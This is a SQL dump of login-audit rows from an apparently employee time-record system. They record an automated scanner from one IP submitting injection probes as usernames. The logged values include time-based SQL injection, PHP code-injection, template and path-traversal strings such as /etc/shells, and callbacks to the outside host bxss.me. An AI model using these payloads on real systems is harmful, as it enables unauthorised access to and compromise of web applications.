INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('695', '', '2023-05-08 03:42:14', '', 'Invalid username/password. Tried with: -1\' OR 2+829-829-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('696', '', '2023-05-08 03:42:14', '', 'Invalid username/password. Tried with: -1\' OR 2+181-181-1=0+0+0+1 or \'j0RL92ce\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('697', '', '2023-05-08 03:42:14', '', 'Invalid username/password. Tried with: -1\" OR 2+384-384-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('698', '', '2023-05-08 03:42:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('699', '', '2023-05-08 03:42:16', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('700', '', '2023-05-08 03:42:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('701', '', '2023-05-08 03:42:17', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('702', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('703', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('704', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('705', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('706', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('707', '', '2023-05-08 03:42:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('708', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('709', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('710', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: ${10000461+9999877}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('711', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('712', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: response.write(9565499*9731377)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('713', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('714', '', '2023-05-08 03:42:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('715', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: \'+response.write(9565499*9731377)+\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('716', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('717', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('718', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: \"+response.write(9565499*9731377)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('719', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('720', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: MG5ycjU2MlQ=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('721', '', '2023-05-08 03:42:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('722', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('723', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('724', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('725', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('726', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('727', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('728', '', '2023-05-08 03:42:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('729', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('730', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('731', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('732', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('733', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('734', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('735', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('736', '', '2023-05-08 03:42:22', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('737', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('738', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hitfr\'.\'otlwdthd2b5d5.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(115).chr(90).chr(121).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('739', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('740', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('741', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('742', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hitlk\".\"jendezlj75aea.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(113).chr(69).chr(110).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('743', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('744', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('745', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('746', '', '2023-05-08 03:42:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('747', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('748', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('749', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('750', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('751', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('752', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('753', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('754', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('755', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('756', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('757', '', '2023-05-08 03:42:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('758', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('759', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('760', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('761', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('762', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('763', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('764', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('765', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('766', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('767', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('768', '', '2023-05-08 03:42:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('769', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('770', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('771', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('772', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('773', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('774', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('775', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('776', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('777', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('778', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('779', '', '2023-05-08 03:42:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('780', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('781', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('782', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('783', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('784', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: 2qmEDp1i\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('785', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('786', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('787', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('788', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('789', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('790', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('791', '', '2023-05-08 03:42:27', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('792', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('793', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('794', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('795', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(98).concat(72).concat(111).concat(65)+(require\"socket\"\nSocket.gethostbyn', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('796', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('797', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('798', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(108).concat(79).concat(116).concat(73)+(require\'socket\'\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('799', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('800', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('801', '', '2023-05-08 03:42:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('802', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('803', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('804', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('805', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('806', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: DDmCyTaD\' OR 687=(SELECT 687 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('807', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('808', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('809', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('810', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('811', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('812', '', '2023-05-08 03:42:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('813', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('814', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('815', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('816', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('817', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
